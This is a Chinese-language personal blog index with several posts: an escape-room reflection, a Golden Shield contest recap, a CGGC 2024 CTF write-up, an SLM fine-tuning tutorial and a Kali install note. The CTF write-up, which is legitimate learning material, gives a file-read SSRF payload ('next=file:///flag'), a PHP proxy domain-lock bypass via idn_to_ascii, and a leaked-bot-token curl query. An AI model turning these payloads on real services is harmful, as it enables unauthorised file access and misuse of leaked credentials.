title="挑戰與總結"></a>挑戰與總結</h2><ul><li>在製作密室逃脫前，老師有帶大家去玩了一次密室逃脫。加上自己過往的經驗，發下密室逃脫的故事劇情總是相當的牽強，因此在本次密室逃脫設計時，我就希望能夠讓故事是通順符合邏輯的，但最後因為沒有被分配到故事組，所以無法控制故事劇情。</li><li>本來預期八週的製作其成，因為安排上的問題，最後僅使用兩週就將其完成，但也因為這樣，加上學期期末課業繁忙，造成團隊壓力很大，甚至有許多組員在最後一天才趕工完成，也造成了許多的矛盾。</li><li>在開始密室逃脫的前一天準備日，有的組員還沒做完份內的關卡設計，加上並無任何聲光效果，環境搭建相當不樂觀。好險後來組員都有盡力的完成（或是我下海營救XD），加上我使用 <a href="https://github.com/abishekvashok/cmatrix">cmatrix</a> 連接大螢幕播放裝逼（誤）的駭客電影效果，以及使用 KTV 氣氛燈、播放音樂等，最後創造了一場相當成功的密室逃脫遊戲。</li></ul><p><img src="/posts/2025-Cybersecurity-escape-room/image11.webp"></p><p>經過這次的經驗我發現可以透過遊戲的方式傳達知識或理念，這次以「資安」為主軸進行設計，或許也可透過遊戲方式傳達其他議題的想法。另外，在這次合作過程中，可以發現不同個性的組員要如何合作（對付及利用），以及最重要的是，應該提早開工，避免最後壓力山大。</p><p>如果有任何疑問或建議，歡迎來信詢問：<a href="mailto:sunyipingtw@icloud.com">sunyipingtw@icloud.com</a>。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Cyber </tag>
            
            <tag> Event </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024 金盾獎國高中組心得</title>
      <link href="/2024/11/30/2024-csc-writeup/"/>
      <url>/2024/11/30/2024-csc-writeup/</url>
      
        <content type="html"><![CDATA[<p>今年是我第一次參加金盾獎，雖然一開始沒有打算要報名，但因為朋友找我參加，所以我們就找學弟湊了三個小廢人組起一個隊伍，想說去看看金盾是個什麼樣的比賽，隊名「炮灰們」也因此得名，結果最終僥倖進入決賽並獲得「鋒芒畢露獎」，這隊名實在是太諷刺了哈哈。</p><p>在競賽前，我翻遍了網路上所有的心得，發現對於競賽還是有很多不了解的地方，所以這篇文章會盡可能的把整場比賽詳細的紀錄下來，文章裡面也會塞一點點簡單的決賽 Wirteup（雖然只有一題）。</p><h2 id="關於金盾獎"><a href="#關於金盾獎" class="headerlink" title="關於金盾獎"></a>關於金盾獎</h2><p>「金盾獎」全名「資安技能金盾獎」，是由「數位發展部資通安全署」主辦的一場資安競賽，分為初賽與決賽，以下將分別介紹初賽和決賽的詳細資訊。</p><h2 id="初賽"><a href="#初賽" class="headerlink" title="初賽"></a>初賽</h2><p>初賽今年在致理科技大學舉辦，以選擇題的方式進行，會有一台答題的電腦，只能進行答題，因此另外兩個組員就只能坐在旁邊共看一台電腦討論答案。過程中是收手機並完全斷網的，所以考驗的大家對於資安知識的熟悉度和記憶力。今年的題目主要都是藍隊的，還有考一堆工具的名稱。最後我們很僥倖的晉級到了決賽。</p><p>p.s. 不知道為什麼，聽說有去 AIS3 的都沒上（我們這組只有兩個去過 AIS3 Junior）。</p><p><img src="/posts/2024-csc-writeup/01.webp" alt="初賽合照"></p><h2 id="決賽"><a href="#決賽" class="headerlink" title="決賽"></a>決賽</h2><p>今年決賽在臺北文創大樓舉辦，場地環境非常讚。先說最重要的午餐部分，聽說是因為麥當勞無法配合，所以就沒有延續金盾的傳統，今年改吃肯德基。</p><p><img src="/posts/2024-csc-writeup/02.webp" alt="決賽報到處"></p><p>再來說說次要的紀念品部分，一到決賽現場領取識別證就有尊榮的感受（誤），識別證是一張一卡通，超讚的！！雖然今年的紀念品沒有去年的疊疊樂，但有一個金盾的抱枕，也很讚，還有一件襯衫和其他小東西，襯衫和工作人員的顏色不太一樣，但真的超像得來速的麥胞 XD。</p><p><img src="/posts/2024-csc-writeup/03.webp" alt="穿襯衫的工作人員（超像麥胞）"></p><p><img src="/posts/2024-csc-writeup/04.webp" alt="紀念品們"></p><p>好啦，最重要的還是比賽本身，金盾決賽包含一般試題、教學試題和情境題，過程中網路都是完全開放的，除了不能對外和其他人聯絡，還有為了避免大家使用 AI，所以禁止使用任何形式的 Chatbot（本來還想說搞不好可以帶一台 Mac Studio 架 SLM 的說）。</p><p><img src="/posts/2024-csc-writeup/05.webp" alt="題目分佈"></p><p>一般試題和教學試題都是在競賽區進行，題目第一個解開的隊伍可以獲得全部的分數，之後解開該題的其他隊伍分數要打 9 折。教學題可以選擇要不要打開教學文件，如果打開教學文件的話，該題的分數會變成原本的 1/3。</p><p>一般試題有一題是 CVE-2024–4577 的，都拿到 RCE 了，但找不到檔案在哪裡，比賽快結束才找到，超蠢的。還有一題 Crypto 的題目賽後聽別人說好像什麼數字設為 0 就拿到 Flag 了，但這題是其他組員解的，所以具體我也不知道。教學題的部分，教學文件裡面可能會洩漏路徑或密碼，所以可以快速的跳過很多步驟，但我們在最後幾步的地方卡關，超可惜的。</p><p>p.s. 記得要帶隨身碟和確保電腦可以連接 RJ45，現場只提供有線的網路。</p><p><img src="/posts/2024-csc-writeup/06.webp" alt="決賽場地圖"></p><p>情境題會在競賽期間，抽出一段時間去情境試題區考試（這次是 50 分鐘）。今年情境題有兩個題目，報到時會抽籤決定，我們抽到的是「GCB 顧問公司」，報到後到會有開幕典禮才開始比賽，所以在這段時間可以趕快查關鍵字，我們就很認真的看了<a href="https://www.nics.nat.gov.tw/core_business/cybersecurity_defense/GCB/">國家資通安全研究院的政府組態基準(GCB)</a>，結果題目根本跟這個完全沒關係，最後完全就不會做，在那邊耗了 50 分鐘拿了 0 分就趕快回去打其他題目了。不過這次國高中組好像沒有隊伍拿到情境題的分數。</p><p><img src="/posts/2024-csc-writeup/07.webp" alt="情境題說明"></p><p>最後在競賽結束的 30 分鐘前，外面的計分板被關掉，當時我們第五，最後 30 分鐘很想再打一題衝上去，又很擔心其他隊伍超過我們，好險最後還是拿到鋒芒畢露獎。接下來就是頒獎合照然後和一堆大人物合照。</p><p><img src="/posts/2024-csc-writeup/08.webp" alt="合照"></p><p><img src="/posts/2024-csc-writeup/09.webp" alt="合照"></p><p><img src="/posts/2024-csc-writeup/10.webp" alt="合照"></p><p><img src="/posts/2024-csc-writeup/11.webp" alt="合照"></p><p>文章就差不多到這邊了，如果有任何問題，歡迎來信詢問：<a href="mailto:sunyipingtw@icloud.com">sunyipingtw@icloud.com</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Cyber </tag>
            
            <tag> Competition </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024 CGGC 心得及 Writeup</title>
      <link href="/2024/11/09/2024-CGGC-writeup/"/>
      <url>/2024/11/09/2024-CGGC-writeup/</url>
      
        <content type="html"><![CDATA[<p>這次是我第一次和其他人組隊打 CTF，也是第一次那麼認真的打 CTF，先來講一下人事時地物等等的背景資訊好了。</p><p>這次我和朋友一共四個人組隊參加比賽，為了增加打題目的效率和互動討論，我們的指導老師陳晉老師將復興高中的圖書館開放給我們以及他的其他學生打題目，並透過安排了兩天一夜的時間讓我們專注比賽（雖然我中途跑去比學科能力競賽所以沒有住宿啦）。</p><p>這次的陣容有一些新手，經過競賽後發現每個人都各有所長、各司其職，以下以 A、B、C、D 代稱四位組員，A 和 B 因為有較多的經驗，所以負責專注的打比賽；而 C 相對缺乏經驗，因此 D 在旁邊拉著他，避免拖到團隊後腿（誤）；同時 C 也被賦予了一個相當重要的角色 — — 負責大家的伙食，一到飯點就會聽到 C 開始揪大家叫外送、飲料、豆花。就在我們四位組員巧妙的完美配合下，最終打穿 3 題以 200 分的成績，拿到 27/122 的名次（雖然沒有到很好啦哈哈）。</p><p><img src="/posts/2024-CGGC-writeup/01.webp" alt="計分板截圖"></p><hr><h2 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h2><h3 id="Web-previewsite"><a href="#Web-previewsite" class="headerlink" title="Web: previewsite"></a>Web: previewsite</h3><p>網頁是一個提供註冊和登入的頁面，登入後可透過線上工具發送請求到使用者輸入的網址，並顯示回應內容。<br>題目敘述說明 Flag 位於檔案路徑 <code>/flag</code> 中，但在 source code 中請求的網址有進行阻擋，請求的開頭必須為字串 <code>http://previewsite/</code> 。</p><p><img src="/posts/2024-CGGC-writeup/02.webp"></p><p>經過觀察發現第 14 行的 <code>urlopen</code>，不僅可以對網址發送請求，還可以開啟檔案。同時為了繞過請求網址開頭的限制，最後透過參數 <code>?next</code> 獲取開啟檔案。最後使用 Payload：<code>http://previewsite/logout?next=file:///flag</code> 順利獲得 Flag。</p><h3 id="Web-proxy"><a href="#Web-proxy" class="headerlink" title="Web: proxy"></a>Web: proxy</h3><p>題目開啟後顯示原始碼：</p><pre><code class="hljs plaintext">&lt;?phpfunction proxy($service) {    // $service = "switchrange";    // $service = "previewsite";    // $service = "越獄";    $requestUri = $_SERVER['REQUEST_URI'];    $parsedUrl = parse_url($requestUri);    $port = 80;    if (isset($_GET['port'])) {        $port = (int)$_GET['port'];    } else if ($_COOKIE["port"]) {        $port = (int)$_COOKIE['port'];    }    setcookie("service", $service);    setcookie("port", $port);    $ch = curl_init();    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);    $filter = '!$%^&amp;*()=+[]{}|;\'",&lt;&gt;?_-/#:.\\@';    $fixeddomain = trim(trim($service, $filter).".cggc.chummy.tw:".$port, $filter);    $fixeddomain = idn_to_ascii($fixeddomain);    $fixeddomain = preg_replace('/[^0-9a-zA-Z-.:_]/', '', $fixeddomain);    curl_setopt($ch, CURLOPT_URL, 'http://'.$fixeddomain.$parsedUrl['path'].'?'.$_SERVER['QUERY_STRING']);    curl_exec($ch);    curl_close($ch);}if (!isset($_GET['service']) &amp;&amp; !isset($_COOKIE["service"])) {    highlight_file(__FILE__);} else if (isset($_GET['service'])) {    proxy($_GET['service']);} else {    proxy($_COOKIE["service"]);}</code></pre><p>題目要求要請求到一個網址，但我忘記是哪裡了，總之就是一個網址，但此題程式碼強制其鎖定在 <code>.cggc.chummy.tw</code> 內，因此要想辦法繞過。一開始還想在後面加上一些東西繞過去請求，參考這篇，後來發現一直不可行，最後發現可以從 <code>idn_to_ascii</code> 下手。只要輸入很長的字串，<code>idn_to_ascii</code> 就無法解析，然後就會回傳 <code>null</code>，所以最後將 <code>service</code> 設為一個很長的字串就成功繞過了，比賽結束後老師說輸入一個 Unicode 也能使其無法解析。</p><h3 id="Misc-Day31-水落石出！真相大白的十一月預告信？"><a href="#Misc-Day31-水落石出！真相大白的十一月預告信？" class="headerlink" title="Misc: Day31- 水落石出！真相大白的十一月預告信？"></a>Misc: Day31- 水落石出！真相大白的十一月預告信？</h3><p>這題給了一個鐵人賽文章連結：<a href="https://ithelp.ithome.com.tw/users/20168875/ironman/7849">https://ithelp.ithome.com.tw/users/20168875/ironman/7849</a>，使用 Ticket 詢問此題的小小提示得到是 Information Leak 但我翻遍了 30 天的文章都沒找到 Flag，最後發現在第 19 天的地方 Token 洩漏，使用：<code>curl -s -X POST &lt;https://api.telegram.org/bot&gt;&lt;YOUR_BOT_TOKEN&gt;/getUpdates</code> 就找到 Flag 了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Cyber </tag>
            
            <tag> Competition </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微調小型語言模型（SLM）製作輔導諮商語音聊天機器人</title>
      <link href="/2024/09/17/2024-SLM-tunning/"/>
      <url>/2024/09/17/2024-SLM-tunning/</url>
      
        <content type="html"><![CDATA[<h2 id="簡介"><a href="#簡介" class="headerlink" title="簡介"></a>簡介</h2><p>隨著人工智慧技術的發展，加上 Apple 對開源社群的投資，想要在自己的 Mac 電腦上運行語言模型已不再是什麼困難的事情。</p><p>於是我就開始思考，語言模型除了製作類似 ChatGPT 的聊天機器人，是否還能運用在其他領域。眾所周知，心理諮商的成本相當之高，一小時的諮商可能就要花掉上千元，然而在諮商時，往往需要耗費大把的時間在搜集病人的基本資訊及背景，若能透過語言模型製作輔導諮商的聊天機器人將可降低大量時間與金錢成本。</p><p>心理諮商師的語氣和說話模式是諮商時的關鍵重點之一，而模型微調即是相當適合改變語言模型說話模式的途徑。</p><p>因此我想使用心理諮商的對話紀錄資料集微調小型語言模型並進行語音的訓練，製作輔導諮商語音聊天機器人，以協助心理諮商領域降低諮商成本。</p><p>然而本次製作僅為測試階段及示範，並無實際拿相關資料進行訓練。</p><h2 id="製作規劃與架構"><a href="#製作規劃與架構" class="headerlink" title="製作規劃與架構"></a>製作規劃與架構</h2><ol><li><strong>建置環境</strong>：建立 conda 環境並使用 GitHub 上的 <a href="https://github.com/linyiLYi/bilibot">linyiLYi/bilibot</a> 專案。</li><li><strong>下載模型</strong>：下載本次使用的 <a href="https://huggingface.co/Qwen/Qwen1.5-4B-Chat">Qwen/Qwen1.5-4B-Chat</a> 模型。本次運行的環境如下：<ul><li>CPU：Apple M1 Pro</li><li>RAM：16 GB</li></ul></li><li><strong>進行微調</strong>：借助 <a href="https://github.com/ml-explore/mlx-examples/blob/main/llms/mlx_lm/LORA.md">mlx-lm</a> 進行微調。</li><li><strong>語音生成</strong>：透過 <a href="https://github.com/RVC-Boss/GPT-SoVITS">GPT-SoVITS</a> 將語言模型的問答進行生成語音。</li></ol><hr><h2 id="Step-1：環境建置"><a href="#Step-1：環境建置" class="headerlink" title="Step 1：環境建置"></a>Step 1：環境建置</h2><blockquote><ol><li>克隆 <a href="https://github.com/linyiLYi/bilibot">linyiLYi/bilibot</a> 的專案：</li></ol></blockquote><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/linyiLYi/bilibot.git</code></pre><blockquote><ol start="2"><li>執行以下指令確認 Anaconda 是否安裝，若沒有成功顯示版本號，請至<a href="https://www.anaconda.com/download/success">官網</a>下載並安裝 Anaconda。</li></ol></blockquote><pre><code class="hljs bash">conda --version</code></pre><blockquote><ol start="3"><li>建立環境並啟動：</li></ol></blockquote><pre><code class="hljs bash">conda create -n bilibot python=3.10conda activate bilibot</code></pre><blockquote><ol start="4"><li>進入 bilibot 資料夾中並安裝套件：</li></ol></blockquote><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> bilibotpip install -r requirements.txt</code></pre><h2 id="Step-2-下載模型"><a href="#Step-2-下載模型" class="headerlink" title="Step 2: 下載模型"></a>Step 2: 下載模型</h2><blockquote><ol><li>透過 brew 安裝 git-lfs，或在<a href="https://git-lfs.com/">官網</a>查看其他安裝方式：</li></ol></blockquote><pre><code class="hljs bash">git lfs install</code></pre><blockquote><ol start="2"><li>在 <code>bilibot/</code> 中建立資料夾 <code>models</code>：</li></ol></blockquote><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> models</code></pre><blockquote><ol start="3"><li>進入 <code>models</code> 資料夾並下載模型，本次使用 Qwen1.5-4B-Chat 作為範例：</li></ol></blockquote><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> modelsgit <span class="hljs-built_in">clone</span> https://huggingface.co/Qwen/Qwen1.5-4B-Chat</code></pre><h2 id="Step-3：進行微調"><a href="#Step-3：進行微調" class="headerlink" title="Step 3：進行微調"></a>Step 3：進行微調</h2><blockquote><ol><li>回到 <code>bilibot/</code> 資料夾</li></ol></blockquote><blockquote><ol start="2"><li>輸入以下指令進行微調，當中的 <code>-batcb-size</code> 若電腦能夠負荷，可改為 <code>16</code>：</li></ol></blockquote><pre><code class="hljs bash">python -m mlx_lm.lora --model models/Qwen1.5-4B-Chat --data data/ --train --iters 1000 --batch-size 4 --lora-layers 12</code></pre><blockquote><ol start="3"><li>將微調後的 adapters 文件與原模型合併：</li></ol></blockquote><pre><code class="hljs bash">python -m mlx_lm.fuse --model models/Qwen1.5-4B-Chat --save-path models/Qwen1.5-4B-Chat-FT --adapter-path adapters/</code></pre><blockquote><ol start="4"><li>對壓縮後的模型進行加速，執行以下指令前，需對 tools/copress_model.py 檔的內容將模型路徑及檔名進行修改：</li></ol></blockquote><pre><code class="hljs bash">python tools/compress_model.py</code></pre><blockquote><ol start="5"><li>對話測試，執行以下指令前，需對 main/chat.py 檔的內容將模型路徑及檔名進行修改：</li></ol></blockquote><pre><code class="hljs bash">python chat.py</code></pre><blockquote><ol start="6"><li>現在你可以和一個經過微調，讓說話模式變得很像酸民的聊天機器人。</li></ol></blockquote><p><img src="/posts/2024-SLM-tunning/image.png" alt="Screenshot 2024-07-23 at 00.15.18.png"></p><h2 id="Step-4-語音生成"><a href="#Step-4-語音生成" class="headerlink" title="Step 4: 語音生成"></a>Step 4: 語音生成</h2><p>透過 <a href="https://github.com/RVC-Boss/GPT-SoVITS">GPT-SoVITS</a> 生成語音，Mac 使用者可透過官方的<a href="https://www.yuque.com/baicaigongchang1145haoyuangong/ib3g1e/znoph9dtetg437xb">教學指南</a>操作，指南當中也有教學的<a href="https://b23.tv/wJWCNWc">影片</a>。</p><p>本次以 Apple Silicon 的電腦作為範例，操作步驟如下：</p><blockquote><ol><li>下載並解壓縮資料：<a href="https://www.icloud.com/iclouddrive/0c4q1AeMClzGC2l-srUdlJE8Q#GPT-SoVITS">https://www.icloud.com/iclouddrive/0c4q1AeMClzGC2l-srUdlJE8Q#GPT-SoVITS</a></li><li>進入資料夾後，在終端機輸入：</li></ol></blockquote><pre><code class="hljs bash">bash install\ <span class="hljs-keyword">for</span>\ mac.sh</code></pre><blockquote><ol start="3"><li>執行 webUI：</li></ol></blockquote><pre><code class="hljs bash">./go-webui.command</code></pre><blockquote><ol start="4"><li>依照 Web 中的 UI 進行語音訓練。</li></ol></blockquote><hr><h2 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h2><p>透過這次的實作經驗讓我對於人工智慧有更多的認識，也相當期待未來人工智慧的發展及應用會如何幫助社會更加進步與方便。</p><p>這次的實作我認為最可惜的地方是，沒有完整做出輔導諮商語音聊天機器人，不過後續若有時間，還是可以將這個聊天機器人完整的做出來，並且去更深入的調查、了解諮商領域。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Project </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我用 2007 年的迷你電腦安裝 Kali Linux</title>
      <link href="/2024/09/13/2024-EeePC-Kali/"/>
      <url>/2024/09/13/2024-EeePC-Kali/</url>
      
        <content type="html"><![CDATA[<p>自從 Apple 推出 Arm 規格的 M1 晶片後，許多 CTF 中的 Reverse 和 PWN 題目都無法執行，直到我在家中找到了一台 ASUS 於 2007 年推出的 Eee PC 8G，它使用 8 GB 的 SSD 及 1 GB 記憶體，查了一下發現符合 Kali 的最低硬體要求，於是就心血來潮決定安裝起來！</p><p><img src="/posts/2024-EeePC-Kali/01.webp"></p><h2 id="Step-1：下載映像檔"><a href="#Step-1：下載映像檔" class="headerlink" title="Step 1：下載映像檔"></a>Step 1：下載映像檔</h2><p>前往 <a href="https://www.kali.org/get-kali/#kali-installer-images">Kali 官網下載</a> iso 映像檔，注意：Eee PC 8G 的 CPU 為 32-bit，因此在下載時需應選擇 32-bit 的版本。</p><p><img src="/posts/2024-EeePC-Kali/02.webp"></p><h2 id="Step-2：製作安裝碟"><a href="#Step-2：製作安裝碟" class="headerlink" title="Step 2：製作安裝碟"></a>Step 2：製作安裝碟</h2><p>準備一隻隨身碟作為安裝碟，並下載製作工具，Windows 使用者請安裝 <a href="https://rufus.ie/">Rufes</a>，MacOS 使用者則是安裝 <a href="https://www.balena.io/etcher/">Etcher</a>。接著匯入下載好的映像檔並選擇隨身碟作為安裝碟即可開始製作安裝碟。</p><p><img src="/posts/2024-EeePC-Kali/03.webp"></p><h2 id="Step-3：開始安裝-Kali"><a href="#Step-3：開始安裝-Kali" class="headerlink" title="Step 3：開始安裝 Kali"></a>Step 3：開始安裝 Kali</h2><p>將製作好的開機碟插入 Eee PC 8G 並重新開機後點擊 F2 進入 BIOS，將隨身碟設定為開機順位一的裝置，接著就可以開始設定 Kali 了，安裝完成！</p><hr><h2 id="後紀"><a href="#後紀" class="headerlink" title="後紀"></a>後紀</h2><p>原本嘗試將系統安裝在電腦內置的 8G SSD 硬碟上，但一直無法成功，因此最後改為安裝在外接的 USB 隨身碟上，才順利完成安裝。另外，安裝完成後突然想到 CTF 的題目大多都是 x86 的題目，32-bit 的電腦還是不能使用，但可以隨身攜帶一台小電腦還是蠻好玩的。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Cyber </tag>
            
            <tag> Project </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
